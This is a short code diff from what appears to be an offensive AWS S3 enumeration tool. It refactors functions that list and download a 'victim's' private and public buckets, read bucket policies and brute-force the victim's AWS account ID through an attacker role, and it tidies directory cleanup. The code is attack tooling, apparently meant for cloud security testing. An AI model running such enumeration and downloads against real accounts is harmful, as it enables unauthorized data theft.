@@ -5,7 +5,8 @@ from modules.utils import custom_serializer
 from aws_assume_role_lib import assume_role
 from botocore.exceptions import ClientError
 
-def s3_init_enum(victim_s3_client, s3_unsigned_client, attacker_session, buckets):
+def s3_init_enum(victim_s3_client, attacker_session):
+    buckets = my_globals.victim_buckets
     if victim_s3_client:
         found_buckets = list_buckets(victim_s3_client)
         if found_buckets:
@@ -13,8 +14,8 @@ def s3_init_enum(victim_s3_client, s3_unsigned_client, attacker_session, buckets
             buckets += found_buckets
         download_private_bucket(victim_s3_client, buckets)
         get_bucket_policy(victim_s3_client, buckets)
-    public_buckets = list_public_buckets(s3_unsigned_client, buckets)
-    download_public_bucket(s3_unsigned_client, buckets)
+    public_buckets = list_public_buckets(my_globals.unsigned_s3_client, buckets)
+    download_public_bucket(my_globals.unsigned_s3_client, buckets)
     if not my_globals.victim_aws_account_ID:
         if public_buckets and my_globals.attacker_S3_role_arn and attacker_session :
             brute_force_aws_account_id(public_buckets, my_globals.attacker_S3_role_arn, attacker_session)
@@ -81,10 +82,10 @@ def create_bucket_dirs(bucket):
 
 def delete_bucket_dirs(bucket):
     try:
-        if os.path.exists(bucket) and os.path.isdir(bucket) and not os.listdir(bucket):
+        if os.path.exists(bucket) and os.path.isdir(bucket) and len(os.listdir(bucket)) == 0:
             os.rmdir(bucket)
-    except:
-        print(f"{Fore.LIGHTBLACK_EX}Failed to delete directory {bucket}")
+    except Exception as e:
+        print(f"{Fore.LIGHTBLACK_EX}Failed to delete directory {bucket}\n{e}")
 
 
 def download_bucket_objects(s3_client, buckets):
@@ -116,8 +117,8 @@ def download_bucket_objects(s3_client, buckets):
                     sys.exit(0)
                 except:
                     print(f"{Fore.LIGHTBLACK_EX} | Failed to download {file_name} from {bucket}")
-            print()
             os.chdir("..")
+            delete_bucket_dirs(bucket)
         except KeyboardInterrupt:
             print("\nCtrl+C pressed. Exiting.")
             sys.exit(0)
